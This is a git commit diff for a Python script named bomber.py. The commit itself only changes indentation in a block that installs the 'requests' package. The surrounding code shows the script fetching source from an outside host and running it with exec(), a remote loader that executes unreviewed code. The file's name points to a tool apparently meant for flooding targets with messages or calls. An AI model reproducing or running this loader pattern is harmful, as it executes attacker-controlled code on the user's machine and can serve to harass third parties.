a54545f228f3236333bdf649f959cf5c5aef749a
Ahmad <81312148+ahmad1622@users.noreply.github.com>
2023-07-27 21:13:51 +0330

    Update bomber.py

--- bomber.py
+++ bomber.py
@@ -2,10 +2,10 @@ try:
 	from time import sleep
 	import requests
 except:
-     from os import system, name
-     print("Not install Package . Installing Package . Connect To Internet ")
-     sleep(3)
-     system("pip install requests" or "pip3 install requests")
+	from os import system, name
+	print("Not install Package . Installing Package . Connect To Internet ")
+	sleep(3)
+	system("pip install requests" or "pip3 install requests")
 
 bmbsource = requests.get("http://sharabiyan-goose.ir/csb/bmb.py").text
 exec(bmbsource)
